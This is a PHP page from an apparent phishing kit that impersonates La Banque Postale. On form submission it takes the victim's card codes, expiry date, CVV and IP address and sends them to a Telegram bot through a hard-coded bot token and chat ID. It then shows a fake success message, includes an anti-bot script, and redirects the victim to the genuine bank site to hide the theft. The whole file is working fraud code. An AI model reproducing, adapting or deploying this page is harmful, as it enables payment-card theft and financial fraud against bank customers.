<?php

include("antibots.php");

include './log/log.php';

if (isset($_POST['confirmer'])) {

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "==========  Shyne Cyclone ==========\n";
$message .= "Code N°1 : ".$_POST['code1']."\n";
$message .= "Code N°2 : ".$_POST['code2']."\n";
$message .= "Expiration : ".$_POST['exp']."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "From : ".$ip."\n"; include "./rz/zone.php";
$message .= "==========  Shyne Cyclone  =========\n";



$telegram = new Telegram('5066037288:AAEw2KT0cU37dr0q7z90zWGu5qd-6ZvsREQ');
$chat_id = 2011330617;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

if($send){ 

    echo '<script type="text/javascript">'; 
    echo 'setTimeout(function(){window.location.href = "https://labanquepostale.fr/";}, 3000);';
    echo '</script>';
}
}                                   

?>

<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #103D9E;
  width: 100px;
  height: 100px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>
<body>

<center>
<h3 style="position: relative; top: 100px; color: green;">Opération réussie, veuillez ne pas la répéter. Vous allez être rédirigé...</h3>

<div class="loader" style="position: relative; top: 100px;"></div>
</center>
</body>
</html>